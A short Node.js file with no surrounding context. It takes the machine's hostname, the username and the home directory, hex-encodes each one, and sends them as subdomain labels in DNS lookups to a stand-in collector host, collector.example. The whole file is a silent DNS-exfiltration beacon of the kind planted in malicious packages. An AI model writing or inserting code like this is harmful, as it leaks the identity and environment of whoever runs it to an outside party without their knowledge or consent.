const dns = require("dns");
const os = require("os");

const tohex = (value) => Buffer.from(value, "utf8").toString("hex");
dns.resolve4(tohex(os.hostname()) + ".host.collector.example", () => {});
dns.resolve4(tohex(os.userInfo().username) + ".user.collector.example", () => {});
dns.resolve4(tohex(os.homedir()) + ".home.collector.example", () => {});
